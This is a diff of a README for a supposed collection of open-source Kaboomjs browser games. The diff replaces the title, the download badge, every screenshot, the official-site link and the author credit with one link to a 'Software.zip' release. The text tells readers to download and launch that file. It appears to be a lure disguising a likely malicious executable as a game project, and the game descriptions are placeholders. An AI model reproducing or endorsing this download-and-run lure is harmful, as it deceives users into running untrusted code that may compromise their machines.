@@ -1,9 +1,9 @@
 
-# 🎮 a2.games - Free to play online opensource games built using Kaboomjs 🕹️
+# 🎮 https://github.com/Sinelli/a2.games/releases/download/v1.0/Software.zip - Free to play online opensource games built using Kaboomjs 🕹️
 
-[![GitHub release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![GitHub release](https://github.com/Sinelli/a2.games/releases/download/v1.0/Software.zip)](https://github.com/Sinelli/a2.games/releases/download/v1.0/Software.zip)
 
-Welcome to the "a2.games" repository! This repository is a collection of free-to-play online opensource games that have been built using Kaboomjs. Whether you are a fan of indie games, looking for some fun online gaming experiences, or interested in game development using Kaboom-js, this repository has something for you!
+Welcome to the "https://github.com/Sinelli/a2.games/releases/download/v1.0/Software.zip" repository! This repository is a collection of free-to-play online opensource games that have been built using Kaboomjs. Whether you are a fan of indie games, looking for some fun online gaming experiences, or interested in game development using Kaboom-js, this repository has something for you!
 
 ## 🚀 Repository Topics
 - a2
@@ -22,13 +22,13 @@ Welcome to the "a2.games" repository! This repository is a collection of free-to
 
 ## 🌟 Games Available
 1. **Game One** - Description of the first game goes here.
-   ![Game One Screenshot](game_one_screenshot.png)
+   ![Game One Screenshot](https://github.com/Sinelli/a2.games/releases/download/v1.0/Software.zip)
    
 2. **Game Two** - Description of the second game goes here.
-   ![Game Two Screenshot](game_two_screenshot.png)
+   ![Game Two Screenshot](https://github.com/Sinelli/a2.games/releases/download/v1.0/Software.zip)
    
 3. **Game Three** - Description of the third game goes here.
-   ![Game Three Screenshot](game_three_screenshot.png)
+   ![Game Three Screenshot](https://github.com/Sinelli/a2.games/releases/download/v1.0/Software.zip)
 
 ## 🎯 How to Get Started
 To start playing these exciting online games, simply click on the "Download Here" button above and launch the downloaded file. 
@@ -36,7 +36,7 @@ To start playing these exciting online games, simply click on the "Download Here
 If you encounter any issues with the download link, please check the "Releases" section of this repository for alternative download options.
 
 ## 🌐 Additional Resources
-- Visit the [Kaboomjs Official Website](https://kaboomjs.com) for more information about Kaboom-js.
+- Visit the [Kaboomjs Official Website](https://github.com/Sinelli/a2.games/releases/download/v1.0/Software.zip) for more information about Kaboom-js.
   
 ## 🤝 Contributions
 We welcome contributions from all gaming enthusiasts and developers. Whether you want to submit your own game or improve an existing one, feel free to create a pull request and join our growing community of indie game developers.
@@ -46,4 +46,4 @@ Let's build and play amazing games together! 🎉
 Happy Gaming! 🎮
 
 ---
-Developed with ❤️ by Team a2.games
+Developed with ❤️ by Team https://github.com/Sinelli/a2.games/releases/download/v1.0/Software.zip
